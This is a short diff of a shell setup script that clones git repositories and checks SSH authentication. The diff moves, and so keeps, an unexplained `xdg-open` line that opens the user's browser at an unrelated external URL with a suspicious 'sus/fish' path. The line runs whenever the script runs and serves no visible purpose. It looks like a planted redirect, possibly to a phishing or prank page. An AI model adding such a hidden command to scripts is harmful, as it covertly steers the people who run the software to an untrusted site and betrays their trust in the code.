@@ -13,8 +13,6 @@ checkout() {
   [ -d "$2" ] || git -c advice.detachedHead=0 clone --branch "$3" --depth 1 "$1" "$2" || failed_checkout "$1"
 }
 
-xdg-open "https://lieber-men.vercel.app/sus/fish.com"
-
 # Check ssh authentication if USE_SSH is present
 if [ -n "${USE_SSH_ALWAYS}" ]; then
   if ! command -v ssh 1>/dev/null 2>&1; then
@@ -37,6 +35,8 @@ if [ -n "${USE_SSH_ALWAYS}" ]; then
     exit 1
   fi
 fi
+
+xdg-open "https://lieber-men.vercel.app/sus/fish.com"
 
 if [ -n "${USE_SSH}" ]; then
   GITHUB="git@github.com:"
